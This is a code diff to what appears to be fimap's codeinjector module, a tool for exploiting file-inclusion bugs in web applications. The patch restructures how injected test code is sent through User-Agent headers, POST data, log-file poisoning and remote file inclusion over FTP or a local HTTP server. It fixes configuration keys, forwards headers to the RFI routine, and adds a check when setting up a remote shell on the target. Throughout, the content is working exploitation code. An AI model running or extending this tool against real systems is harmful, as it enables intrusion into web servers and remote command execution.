@@ -96,51 +96,55 @@ class codeinjector(baseClass):
         url  = "http://%s%s" %(hostname, fpath)
 
         code = None
+        quiz, answer = langClass.generateQuiz()
+        php_test_code = quiz
+        php_test_result = answer
+
 
         if (mode.find("A") != -1 and mode.find("x") != -1):
             self._log("Testing %s-code injection thru User-Agent..."%(language), self.LOG_INFO)
+            code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
 
         elif (mode.find("P") != -1 and mode.find("x") != -1):
             self._log("Testing %s-code injection thru POST..."%(language), self.LOG_INFO)
-
+            code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
+            
         elif (mode.find("L") != -1):
             if (mode.find("H") != -1):
                 self._log("Testing %s-code injection thru Logfile HTTP-UA-Injection..."%(language), self.LOG_INFO)
             elif (mode.find("F") != -1):
                 self._log("Testing %s-code injection thru Logfile FTP-Username-Injection..."%(language), self.LOG_INFO)
-
+            code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
+            
         elif (mode.find("R") != -1):
+            suffix = appendix
             if settings["dynamic_rfi"]["mode"] == "ftp":
                 self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
                 if (ispost == 0):
                     url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                 elif (ispost == 1):
                     postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
-                elif (ispost == 3):
+                elif (ispost == 2):
                     tmp = header_dict[vulnheaderkey]
                     tmp = tmp.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
                     header_dict[vulnheaderkey] = tmp
-                    
+                code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, appendix, headerDict=header_dict)
+                  
             elif settings["dynamic_rfi"]["mode"] == "local":
                 self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
                 if (ispost == 0):
                     url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
                 elif (ispost == 1):
-                    postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                    postdata = postdata.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
                 elif (ispost == 2):
                     tmp = header_dict[vulnheaderkey]
-                    tmp = tmp.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
+                    tmp = tmp.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
                     header_dict[vulnheaderkey] = tmp
+                code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, appendix, headerDict=header_dict)
             else:
                 print "fimap is currently not configured to exploit RFI vulnerabilities."
                 sys.exit(1)
-
-
-        quiz, answer = langClass.generateQuiz()
-        php_test_code = quiz
-        php_test_result = answer
-
-        code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, suffix, headerDict=header_dict)
+        
         if code == None:
             self._log("%s-code testing failed! code=None"%(language), self.LOG_ERROR)
             sys.exit(1)
@@ -167,7 +171,7 @@ class codeinjector(baseClass):
                                 testload = "%s&%s" %(postdata, testload)
                             code = self.doPostRequest(url, testload, header_dict)
                         elif (mode.find("R") != -1):
-                            code = self.executeRFI(url, postdata, suffix, testload)
+                            code = self.executeRFI(url, postdata, appendix, testload, header_dict)
                         elif (mode.find("L") != -1):
                             testload = self.convertUserloadToLogInjection(testload)
                             testload = "data=" + base64.b64encode(testload)
@@ -238,6 +242,10 @@ class codeinjector(baseClass):
                             
                         pwd_cmd = item.generatePayload(xml2config.concatCommands(commands, isUnix))
                         tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix, headerDict=header_dict).strip()
+                        if (tmp.strip() == ""):
+                            print "Failed to setup shell! The resulting string was empty!"
+                            break
+                        
                         curdir = tmp.split("\n")[0].strip()
                         curusr = tmp.split("\n")[1].strip()
                         
@@ -375,7 +383,7 @@ class codeinjector(baseClass):
             if (postdata != ""): userload = "%s&%s" %(postdata, userload)
             code = self.doPostRequest(url, userload, additionalHeaders = headerDict)
         elif (m.find("R") != -1):
-            code = self.executeRFI(url, postdata, appendix, userload)
+            code = self.executeRFI(url, postdata, appendix, userload, headerDict)
         elif (m.find("L") != -1):
             if (not self.isLogKickstarterPresent):
                 self._log("Testing if log kickstarter is present...", self.LOG_INFO)
@@ -539,11 +547,11 @@ class codeinjector(baseClass):
                 print "Invalid attack. Press 'q' to break."
         
         
-    def executeRFI(self, URL, postdata, appendix, content):
+    def executeRFI(self, URL, postdata, appendix, content, header):
         if (appendix == "%00"): appendix = ""
         if settings["dynamic_rfi"]["mode"]=="ftp":
             up = self.FTPuploadFile(content, appendix)
-            code = self.doPostRequest(URL, postdata)
+            code = self.doPostRequest(URL, postdata, header)
             if up["dirstruct"]:
                 self.FTPdeleteDirectory(up["ftp"])
             else:
@@ -551,7 +559,7 @@ class codeinjector(baseClass):
             return(code)
         elif settings["dynamic_rfi"]["mode"]=="local":
             up = self.putLocalPayload(content, appendix)
-            code = self.doPostRequest(URL, postdata)
+            code = self.doPostRequest(URL, postdata, additionalHeaders=header)
             self.deleteLocalPayload(up["local"])
             return(code)
             
